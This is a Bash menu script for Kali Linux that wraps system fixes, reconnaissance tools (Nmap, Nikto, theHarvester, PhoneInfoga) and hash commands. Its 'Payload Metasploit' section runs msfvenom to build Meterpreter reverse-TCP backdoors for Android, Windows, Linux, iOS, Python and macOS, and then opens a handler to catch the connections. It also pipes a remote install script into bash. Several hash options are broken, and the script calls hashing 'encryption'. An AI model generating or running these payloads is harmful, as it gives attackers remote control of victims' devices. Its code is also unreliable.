
clear


#This is Blod color
green='\e[1;32m'
cyan='\e[1;36m'
red='\e[1;31m'
blue='\e[1;34m'
white='\e[1;37m'
yellow='\e[1;33m'
purple='\e[1;35m'
##################
clear
echo -e $red
echo  "                                                          ";
echo  "                                                          ";
echo  "                                                          ";
echo  "                                              t           ";
echo  "                                   ..       : EE.         ";
echo  "                                  ,W,     .Et :KW;        ";
echo  "                                 t##,    ,W#t   G#j       ";
echo  "                                L###,   j###t    j#D.     ";
echo  "                              .E#j##,  G#fE#t itttG#K,    ";
echo  "                             ;WW; ##,:K#i E#t E##DDDDG:   ";
echo  "                            j#E.  ##f#W,  E#t E#E         ";
echo  "                          .D#L    ###K:   E#t E#E         ";
echo  "                         :K#t     ##D.    E#t E##EEEEEEt  ";
echo  "                         ...      #G      ..  tffffffffft ";
echo  "                                  j                       ";
echo  "                                                          ";
echo ""

echo ""
echo -e $white "                          Please Press Enter To Start  "
read Enter
clear
figlet " Welcome MR.Hacker " | lolcat
echo -e $red "                  $purple<<<$white The Script By: MEDO 2L7ALABE$purple >>>"
echo ''
echo -e $white " Follow me :"
echo            "  ^^^^^^^^^^^"
echo -e $blue " Telegram: MEDO_2L7ALABE           |            Youtube: MEDO2L7ALABE"
echo            "  -----------------------                        -----------------------"
echo -e $blue " Github: Medo2l7alabe              |            Facebook: MEDO.2L7ALABE"
echo            "  -----------------------                        -----------------------"
echo -e $white "         }--------------------------------------------------{"
echo ''
echo -e $red "{1}--"$white" Kali Repair"
echo
echo -e $red "{2}--"$white" Collection of information"
echo
echo -e $red "{3}--"$white" Payload Metasploit"
echo
echo -e $red "{4}--"$white" Hash"
echo
echo -e $red "{0}--"$white" Exit"
echo
read -p "Enter the Number: " SY
######################################
if [ "$SY" = 0 ]
then
clear
figlet " Bay Bay " | lolcat
fi
######################################
if [ "$SY" = 1 ]
then
clear
echo ""
echo -e $red
echo "  _  __          _      _____   _____                  _      ";
echo " | |/ /    /\   | |    |_   _| |  __ \                (_)     ";
echo " | ' /    /  \  | |      | |   | |__) |___ _ __   __ _ _ _ __ ";
echo " |  <    / /\ \ | |      | |   |  _  // _ \ '_ \ / _\` | | '__|";
echo " | . \  / ____ \| |____ _| |_  | | \ \  __/ |_) | (_| | | |   ";
echo " |_|\_\/_/    \_\______|_____| |_|  \_\___| .__/ \__,_|_|_|   ";
echo "                                          | |                 ";
echo "                                          |_|                 ";
echo -e $white
echo -e  "{1}-- Update sources.list "
echo -e  "{2}-- Upgrade System Kali "
echo -e  "{3}-- Update and Clean Kali "
echo -e  "{4}-- Fix Sound Problem "
echo -e  "{5}-- fix Problem the Bluetooth "
echo -e  "{6}-- Fix Problem the VPN "
echo -e  "[7]-- Solve copying problem and zoom the screen (VMware)"
echo -e  "{8}-- Back "
echo ""
read -p "Choose the problem number :" Update
if [ $Update = 8 ]
then
clear
bash M2.sh
fi
if [ $Update = 1 ]
then
clear
echo -e $green "Installing the Sorcerer Please wait..."
sleep 2
rm /etc/apt/sources.list
echo "deb http://http.kali.org/kali sana main non-free contrib" >> /etc/apt/sources.list
echo "deb http://security.kali.org/kali-security sana/updates main contrib non-free" >> /etc/apt/sources.list
echo "deb-src http://http.kali.org/kali sana main non-free contrib" >> /etc/apt/sources.list
echo "deb-src http://security.kali.org/kali-security sana/updates main contrib non-free" >> /etc/apt/sources.list
echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list
echo "deb http://security.kali.org/kali-security kali-rolling/updates main contrib non-free" >> /etc/apt/sources.list
apt-get update
apt-get upgrade
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "The Sorcerer was successfully installed !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 2 ]
then
clear
echo -e $green "Upgrading the KALI Please wait..."
sleep 2
apt-get update
apt-get dist-upgrade
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "KALI has been successfully upgraded !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 3 ]
then
clear
echo -e $green "Kali is being cleaned and updated Please wait..."
sleep 2
apt-get update && apt-get -y dist-upgrade && apt-get autoremove -y && apt-get -y autoclean
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "Kali has been successfully cleaned and updated !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 4 ]
then
clear
echo -e $green "The audio problem is being fixed Please wait..."
sleep 2
systemctl --user enable pulseaudio && systemctl --user start pulseaudio
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "The sound problem has been successfully fixed !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 5 ]
then
clear
echo -e $green "Bluetooth is fixed Please wait..."
sleep 2
sudo lsmod | grep blue
systemctl enable bluetooth.service
systemctl start bluetooth.service
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "The Bluetooth problem has been successfully resolved !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 6 ]
then
clear
echo -e $green "All VPN problems are fixed Please wait..."
sleep 2
apt-get install network-manager-openvpn-gnome
apt-get install network-manager-pptp
apt-get install network-manager-pptp-gnome
apt-get install network-manager-strongswan
apt-get install network-manager-vpnc
apt-get install network-manager-vpnc-gnome
/etc/init.d/network-manager restart
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "All VPN problems have been successfully resolved !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
if [ $Update = 7 ]
then
clear
echo -e $green "The copying problem is resolved and screen magnification Please wait..."
sleep 2
apt-get install open-vm-tools-desktop fuse
clear
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
echo -e $green "The copy issue and screen magnification have been successfully resolved !!!"
echo ""
echo -e $blue "<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>"
echo ""
fi
fi
######################################
if [ "$SY" = 2 ]
then
clear
echo -e $red
echo "██╗███╗   ██╗███████╗ ██████╗ ██████╗  █████╗ ███╗   ███╗████████╗██╗ ██████╗ ███╗   ██╗";
echo "██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔══██╗████╗ ████║╚══██╔══╝██║██╔═══██╗████╗  ██║";
echo "██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝███████║██╔████╔██║   ██║   ██║██║   ██║██╔██╗ ██║";
echo "██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║   ██║   ██║██║   ██║██║╚██╗██║";
echo "██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ██║╚██████╔╝██║ ╚████║";
echo "╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝";
echo "                                                                                        ";
echo ''
echo -e $red"1-$green Phoneinfoga                     |            $red   7-$green Golismero"
echo ""
echo -e $red"2-$green Maltego                         |          $red     8-$green Nmap"
echo ""
echo -e $red"3-$green Whatweb                         |       $red        9-$green Wordlist"
echo ""
echo -e $red"4-$green Dmitry                          |  $red            10-$green Wapiti"
echo ""
echo -e $red"5-$green Theharvester                    |   $red           11-$green Httrack"
echo ""
echo -e $red"6-$green Nikto                           |     $red         12-$green Information"
echo ""
echo -e $red"99-$green BACK"
echo
read -p "Entre The Number: " name
if [ $name = 99 ]
then
clear
bash M2.sh
fi
if [ $name = 1 ]
then
clear
echo -e $red
echo "██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗██╗███╗   ██╗███████╗ ██████╗  ██████╗  █████╗ ";
echo "██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝██║████╗  ██║██╔════╝██╔═══██╗██╔════╝ ██╔══██╗";
echo "██████╔╝███████║██║   ██║██╔██╗ ██║█████╗  ██║██╔██╗ ██║█████╗  ██║   ██║██║  ███╗███████║";
echo "██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝  ██║██║╚██╗██║██╔══╝  ██║   ██║██║   ██║██╔══██║";
echo "██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║██║     ╚██████╔╝╚██████╔╝██║  ██║";
echo "╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝  ╚═╝";
echo "                                                                                          ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool phoneinfoga"
echo ""
echo -e $white "{2}- Start collecting information"
echo ""
echo -e $whtie " {3}- Back"
echo ""
echo ""
read phone
if [ $phone = 1 ]
then
echo ""
echo ""
echo "Please wait a little..."
sleep 2
curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash
sudo mv ./phoneinfoga /usr/bin/phoneinfoga
fi
if [ $phone = 2 ]
then
echo "Enter the number you want to search for"
echo ""
echo ""
read number
sleep 2
phoneinfoga -n $number
fi
if [ $phone = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 2 ]
then
clear
echo -e $red
echo ""
echo "███╗   ███╗ █████╗ ██╗  ████████╗███████╗ ██████╗  ██████╗ ";
echo "████╗ ████║██╔══██╗██║  ╚══██╔══╝██╔════╝██╔════╝ ██╔═══██╗";
echo "██╔████╔██║███████║██║     ██║   █████╗  ██║  ███╗██║   ██║";
echo "██║╚██╔╝██║██╔══██║██║     ██║   ██╔══╝  ██║   ██║██║   ██║";
echo "██║ ╚═╝ ██║██║  ██║███████╗██║   ███████╗╚██████╔╝╚██████╔╝";
echo "╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝   ╚══════╝ ╚═════╝  ╚═════╝ ";
echo "                                                           ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Maltego"
echo ""
echo -e $white "{2}- Open Maltego"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
echo ""
read MALTEGO
if [ $MALTEGO = 00 ]
then
clear
bash M2.sh
fi
if [ $MALTEGO = 1 ]
then
echo ""
echo ""
echo "Please wait a little..."
sleep 2
apt-get install maltego
fi
if [ $MALTEGO = 2 ]
then
echo ""
echo ""
echo "Loading..."
sleep 2
open maltego
fi
if [ $MALTEGO = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 3 ]
then
clear
echo -e $red
echo ""
echo "██╗    ██╗██╗  ██╗ █████╗ ████████╗██╗    ██╗███████╗██████╗ ";
echo "██║    ██║██║  ██║██╔══██╗╚══██╔══╝██║    ██║██╔════╝██╔══██╗";
echo "██║ █╗ ██║███████║███████║   ██║   ██║ █╗ ██║█████╗  ██████╔╝";
echo "██║███╗██║██╔══██║██╔══██║   ██║   ██║███╗██║██╔══╝  ██╔══██╗";
echo "╚███╔███╔╝██║  ██║██║  ██║   ██║   ╚███╔███╔╝███████╗██████╔╝";
echo " ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚══╝╚══╝ ╚══════╝╚═════╝ ";
echo "                                                             ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Whatweb"
echo ""
echo -e $white "{2}- Start collecting information"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
echo ""
read WHATWEB
if [ $WHATWEB = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install whatweb
fi
if [ $WHATWEB = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
sleep 2
whatweb -v $url
fi
if [ $WHATWEB = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 4 ]
then
clear
echo -e $red
echo ""
echo "██████╗ ███╗   ███╗██╗████████╗██████╗ ██╗   ██╗";
echo "██╔══██╗████╗ ████║██║╚══██╔══╝██╔══██╗╚██╗ ██╔╝";
echo "██║  ██║██╔████╔██║██║   ██║   ██████╔╝ ╚████╔╝ ";
echo "██║  ██║██║╚██╔╝██║██║   ██║   ██╔══██╗  ╚██╔╝  ";
echo "██████╔╝██║ ╚═╝ ██║██║   ██║   ██║  ██║   ██║   ";
echo "╚═════╝ ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ";
echo "                                                ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Dmitry"
echo ""
echo -e $white "{2}- Start by checking the site"
echo ""
echo -e $white "{3}- Start checking the domain associated with the site"
echo ""
echo -e $white "{4}- Back"
echo ""
echo ""
echo ""
echo ""
read DMITRY
if [ $DMITRY = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install dmitry
fi
if [ $DMITRY = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
sleep 2
dmitry -i $url
fi
if [ $DMITRY = 3 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
sleep 2
dmitry -s $url
fi
if [ $DMITRY = 4 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 5 ]
then
clear
echo -e $red
echo ""
echo "                                                                         ";
echo " _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ ";
echo "|_   _|  |  |   __|  |  |  _  | __  |  |  |   __|   __|_   _|   __| __  |";
echo "  | | |     |   __|     |     |    -|  |  |   __|__   | | | |   __|    -|";
echo "  |_| |__|__|_____|__|__|__|__|__|__|\___/|_____|_____| |_| |_____|__|__|";
echo "                                                                         ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Theharvester"
echo ""
echo -e $white "{2}- Start collecting information"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
read THEHARVESTER
if [ $THEHARVESTER = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install theharvester
fi
if [ $THEHARVESTER = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
sleep 2
theharvester -d $url -l 500 -b google
fi
if [ $THEHARVESTER = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 6 ]
then
clear
echo -e $red
echo ""
echo "███╗   ██╗██╗██╗  ██╗████████╗ ██████╗ ";
echo "████╗  ██║██║██║ ██╔╝╚══██╔══╝██╔═══██╗";
echo "██╔██╗ ██║██║█████╔╝    ██║   ██║   ██║";
echo "██║╚██╗██║██║██╔═██╗    ██║   ██║   ██║";
echo "██║ ╚████║██║██║  ██╗   ██║   ╚██████╔╝";
echo "╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ";
echo "                                       ";
echo -e $red
echo ""
echo -e $white "1- Installation tool Nikto"
echo ""
echo -e $white "2- Start by checking"
echo ""
echo -e $white "3- Back"
echo ""
echo ""
read NIKTO
if [ $NIKTO = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install nikto
fi
if [ $NIKTO = 2 ]
then
echo "Please enter the IP address"
echo ""
echo ""
read IP
nikto -h $IP
fi
if [ $NIKTO = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 7 ]
then
clear
echo -e $red
echo ""
echo " ██████╗  ██████╗ ██╗     ██╗███████╗███╗   ███╗███████╗██████╗  ██████╗ ";
echo "██╔════╝ ██╔═══██╗██║     ██║██╔════╝████╗ ████║██╔════╝██╔══██╗██╔═══██╗";
echo "██║  ███╗██║   ██║██║     ██║███████╗██╔████╔██║█████╗  ██████╔╝██║   ██║";
echo "██║   ██║██║   ██║██║     ██║╚════██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║   ██║";
echo "╚██████╔╝╚██████╔╝███████╗██║███████║██║ ╚═╝ ██║███████╗██║  ██║╚██████╔╝";
echo " ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ";
echo "                                                                         ";
echo -e $red
echo ""
echo -e $white "1- Installation tool Golismero"
echo ""
echo -e $white "2- Start collecting information"
echo ""
echo -e $white "3- Back"
echo ""
echo ""
read GOLISMERO
if [ $GOLISMERO = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install golismero
fi
if [ $GOLISMERO = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
golismero scan $url
fi
if [ $GOLISMERO = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 9 ]
then
clear
echo -e $red
echo ""
echo "██╗    ██╗ ██████╗ ██████╗ ██████╗ ██╗     ██╗███████╗████████╗";
echo "██║    ██║██╔═══██╗██╔══██╗██╔══██╗██║     ██║██╔════╝╚══██╔══╝";
echo "██║ █╗ ██║██║   ██║██████╔╝██║  ██║██║     ██║███████╗   ██║   ";
echo "██║███╗██║██║   ██║██╔══██╗██║  ██║██║     ██║╚════██║   ██║   ";
echo "╚███╔███╔╝╚██████╔╝██║  ██║██████╔╝███████╗██║███████║   ██║   ";
echo " ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝╚══════╝   ╚═╝   ";
echo "                                                               ";
echo -e $red
echo -e $white "How many characters and numbers you want to enter?"
echo ""
echo ""
read number
echo "-----------------------"
echo -e $white "Characters Numbers Symbols?"
echo ""
echo ""
read WORD
wordlist -m $number -M $number -o /root/Desktop/Password.txt $WORD
fi
if [ $name = 10 ]
then
clear
echo -e $red
echo ""
echo "██╗    ██╗ █████╗ ██████╗ ██╗████████╗██╗";
echo "██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║";
echo "██║ █╗ ██║███████║██████╔╝██║   ██║   ██║";
echo "██║███╗██║██╔══██║██╔═══╝ ██║   ██║   ██║";
echo "╚███╔███╔╝██║  ██║██║     ██║   ██║   ██║";
echo " ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝";
echo "                                         ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Wapiti"
echo ""
echo -e $white "{2}- Start by checking the site"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
read WAPITI
if [ $WAPITI = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install wapiti
fi
if [ $WAPITI = 2 ]
then
echo "Please the location you want to check"
echo ""
echo ""
read url
wapiti $url
fi
if [ $WAPITI = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 11 ]
then
clear
echo -e $red
echo ""
echo "██╗  ██╗████████╗████████╗██████╗  █████╗  ██████╗██╗  ██╗";
echo "██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝";
echo "███████║   ██║      ██║   ██████╔╝███████║██║     █████╔╝ ";
echo "██╔══██║   ██║      ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ";
echo "██║  ██║   ██║      ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗";
echo "╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝";
echo "                                                          ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Httrack"
echo ""
echo -e $white "{2}- Open Httrack"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
read HTTRACK
if [ $HTTRACK = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install httrack
fi
if [ $HTTRACK = 2 ]
then
httrack
fi
if [ $HTTRACK = 3 ]
then
clear
bash M2.sh
fi
fi
if [ $name = 8 ]
then
clear
echo -e $red
echo ""
echo "███╗   ██╗███╗   ███╗ █████╗ ██████╗ ";
echo "████╗  ██║████╗ ████║██╔══██╗██╔══██╗";
echo "██╔██╗ ██║██╔████╔██║███████║██████╔╝";
echo "██║╚██╗██║██║╚██╔╝██║██╔══██║██╔═══╝ ";
echo "██║ ╚████║██║ ╚═╝ ██║██║  ██║██║     ";
echo "╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ";
echo "                                     ";
echo -e $red
echo ""
echo -e $white "{1}- Installation tool Nmap"
echo ""
echo -e $white "{2}- Start by checking the site"
echo ""
echo -e $white "{3}- Back"
echo ""
echo ""
read NMAP
if [ $NMAP = 1 ]
then
echo "Please wait a little..."
echo ""
echo ""
sleep 2
apt-get install nmap
fi
if [ $NMAP = 2 ]
then
echo""
echo "Please place the IP address you want to check"
echo ""
echo ""
read IP
clear
echo -e "Nmap scan for:"
echo ""
echo -e "{1}- Simple Scan [-sV]"
echo ""
echo -e "{2}- Port Scan [-Pn]"
echo ""
echo -e "{3}- Operating System Detection [-A]"
echo ""
echo -e "{4}- Back"
echo ""
echo ""
read scan
if [ "$scan" = 1 ]
then
nmap -sV $IP
fi
if [ "$scan" = 2 ]
then
nmap -Pn $IP
fi
if [ "$scan" = 3 ]
then
nmap -A $IP
fi
if [ "$scan" = 4 ]
then
clear
bash M2.sh
fi
fi
if [ $NMAP = 3 ]
then
clear
bash M2.sh
fi
fi
fi
######################################
if [ "$name" = 12 ]
then
clear
echo -e $red
figlet -f Swan "Inforamtion"
echo
echo -e $red"{$blue 1$red }$green My Ip"
echo
echo -e $red"{$blue 2$red }$green Info Ip and Site"
echo
echo -e $red"{$blue 3$red }$green Host DNS Finder"
echo
echo -e $red"{$blue 6$red }$green info domain"
echo
echo -e $red"{$blue 7$red }$green Extract Links"
echo
echo -e $red"{$blue 0$red }$green BACK"
echo
echo
read -p "Enter The Number: " ipp
if [ $ipp = 1 ]
then
echo -e $cyan
ip=$(curl -s https://api.ipify.org)
echo "My public IP address is: $ip"
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 2 ]
then
echo
read -p "Enter The Ip or site: " ip
curl http://ip-api.com/$ip
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 3 ]
then
echo
read -p "Enter The Site: " site
curl https://api.hackertarget.com/mtr/?q=$site
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 4 ]
then
echo
read -p "Enter The Ip or Site: " port
curl http://api.hackertarget.com/nmap/?q=$port
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 5 ]
then
echo
read -p "Enter The Site: " s
s=$(curl -s http://api.hackertarget.com/hostsearch/?q=$s)
echo "The host is: $s"
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 6 ]
then
echo
read -p 'Enter The domain: ' mail
curl -H "Accept: application/json" \
https://check-host.net/check-tcp?host=smtp://$mail&max_nodes=1
echo
echo -e $blue
echo
echo
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 7 ]
then
echo
read -p "Enter The domain: " df
echo -e $red
curl https://api.hackertarget.com/pagelinks/?q=$df
echo
echo -e $blue
read -p "Preas Any Kay To The Back" enter
bash M2.sh
fi
if [ $ipp = 0 ]
then
clear
bash M2.sh
fi
fi
######################################
if [ "$SY" = 3 ]
then
clear
echo -e $red
echo "███╗   ███╗███████╗████████╗ █████╗ ███████╗██████╗ ██╗      ██████╗ ██╗████████╗";
echo "████╗ ████║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝";
echo "██╔████╔██║█████╗     ██║   ███████║███████╗██████╔╝██║     ██║   ██║██║   ██║   ";
echo "██║╚██╔╝██║██╔══╝     ██║   ██╔══██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   ";
echo "██║ ╚═╝ ██║███████╗   ██║   ██║  ██║███████║██║     ███████╗╚██████╔╝██║   ██║   ";
echo "╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ";
echo "                                                                                 ";
echo
echo -e $red"1-"$green" Payload Android"
echo
echo -e $red"2-"$green" Payload Windows"
echo
echo -e $red"3-"$green" Payload Linux"
echo
echo -e $red"4-"$green" Payload Iso"
echo
echo -e $red"5-"$green" Payload Python"
echo
echo -e $red"6-"$green" Payload Mac"
echo
echo -e $red"0-"$green" Back"
echo
read -p "Enter the Number: " payload
if [ $payload = 0 ]
then
clear
bash M2.sh
fi
if [ $payload = 1 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port R > /root/Desktop/$name.apk
msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp'
fi
if [ $payload = 2 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe -o /root/Desktop/$name.exe
msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp'
fi
if [ $payload = 3 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$host LPORT=$port -o /root/Desktop/$name.elf
msfconsole -x 'use exploit/multi/handler' -x 'set payload linux/x86/meterpreter/reverse_tcp'
fi
if [ $payload = 4 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -o /root/Desktop/$name.api
msfconsole -x 'use exploit/multi/handler' -x 'set payload apple_ios/aarch64/meterpreter_reverse_tcp'
fi
if [ $payload = 5 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=$host LPORT=$port R> /root/Desktop/$name.py
msfconsole -x 'use exploit/multi/handler' -x 'set payload python/meterpreter/reverse_tcp'
fi
if [ $payload = 6 ]
then
echo
read -p "Enter The Host: " host
read -p "Enter The Port: " port
read -p "Enter the Name: " name
msfvenom -p osx/x64/meterpreter_reverse_tcp -f macho LHOST=$host LPORT=$port -o /root/Desktop/$name.macho
msfconsole -x 'use exploit/multi/handler' -x 'set payload osx/x64/meterpreter_reverse_tcp'
fi
fi
######################################
if [ "$SY" = 4 ]
then
clear
echo -e $red "Select the type of tick that you want to encrypt"
echo -e $green
echo "1- md5            |       4- sha512             "
echo "2- sha1           |       5- sha256             "
echo "3- sha224         |       6- sha384             "
echo "0- Back"
echo ""
read hash
if [ $hash = 1 ]
then
echo "Enter the word to encrypt"
read $name1
echo "$name1" | md5sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 2 ]
then
echo "Enter the word to encrypt"
read $name2
echo "$name2" | sha1sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 3 ]
then
echo "Enter the word to encrypt"
read $name3
echo "name3" | sha224sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 4 ]
then
echo "Enter the word to encrypt"
read $name4
echo "$name4" | sha512sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 5 ]
then
echo "Enter the word to encrypt"
read $name5
echo "$name5" | sha256sum
echo -e $red
read -p 'Enter any kay to back' a
fi
###############################
if [ $hash = 6 ]
then
echo "Enter the word to encrypt"
read $name6
echo "$name6" | sha384sum
echo -e $red
read -p 'Enter any kay to back' a
fi
if [ $hash = 0 ]
then
clear
bash M2.sh
fi
fi
###############################

